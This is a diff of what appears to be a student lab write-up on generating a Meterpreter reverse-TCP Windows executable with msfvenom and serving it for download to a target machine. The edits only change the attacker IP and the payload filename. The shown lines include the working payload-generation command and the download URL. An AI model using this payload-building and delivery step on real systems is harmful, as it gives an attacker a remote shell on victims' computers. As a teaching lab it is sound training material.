@@ -32,7 +32,7 @@ Find the attackers ip address using ifconfig
 
 
 Create a malicious executable file fun.exe using msenom command
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.14.241 -f exe > mahisha.exe
 ## OUTPUT
 ![Screenshot 2025-04-07 111401](https://github.com/user-attachments/assets/5469dce6-90fb-4c7c-a969-40777915f820)
 
@@ -83,8 +83,8 @@ exploit
 
 
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
-http://192.168.14.241/fun.exe
-The file "fun.exe" downloads. 
+http://192.168.14.241/mahisha.exe
+The file "mahisha.exe" downloads. 
 ![image](https://github.com/user-attachments/assets/b8a94154-39f4-492d-9328-a12caeb16461)
 
 
